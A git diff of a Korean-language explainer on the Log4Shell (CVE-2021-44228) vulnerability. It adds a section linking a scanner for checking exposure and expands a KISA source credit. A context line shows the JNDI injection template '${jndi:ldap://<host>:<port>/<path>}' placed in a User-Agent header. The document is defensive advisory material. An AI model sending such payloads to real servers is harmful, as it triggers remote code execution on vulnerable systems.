@@ -75,6 +75,8 @@ User-Agent : ${jndi:ldap://<host>:<port>/<path>}
 
 
 
+
+
 ## Log4Shell 취약점은 사상 최약의 취약점?
 
 Log4Shell의 취약점은 RCE취약점으로 취약점 중에서도 심각한 단계의 취약점으로 분류된다.
@@ -88,6 +90,8 @@ Log4Shell의 취약점은 RCE취약점으로 취약점 중에서도 심각한 �
 
 
 
+
+
 ## 영향 받는 버전
 
 1. Apache Log4j 2
@@ -96,6 +100,18 @@ Log4Shell의 취약점은 RCE취약점으로 취약점 중에서도 심각한 �
    - [참고사이트](https://gist.github.com/SwitHak/b66db3a06c2955a9cb71a8718970c592)를 확인하여 해당 제품을 이용 중일 경우, 해당 제조사의 권고에 따라 패치 또는 대응 방안 적용
 
 
+
+
+
+## 점검 방법
+
+[참고 사이트](https://github.com/logpresso/CVE-2021-44228-Scanner)
+
+
+
+
+
+## 
 
 ## 해결방법
 
@@ -110,7 +126,7 @@ Log4Shell의 취약점은 RCE취약점으로 취약점 중에서도 심각한 �
 
 -----
 
-출처: [ESTsecurity](https://blog.alyac.co.kr/4341), [KISA](https://www.krcert.or.kr/data/secNoticeView.do?bulletin_writing_sequence=36389)
+출처: [ESTsecurity](https://blog.alyac.co.kr/4341), [KISA 침해사고분석단 취약점분석팀](https://www.krcert.or.kr/data/secNoticeView.do?bulletin_writing_sequence=36389)
 
 -----
 
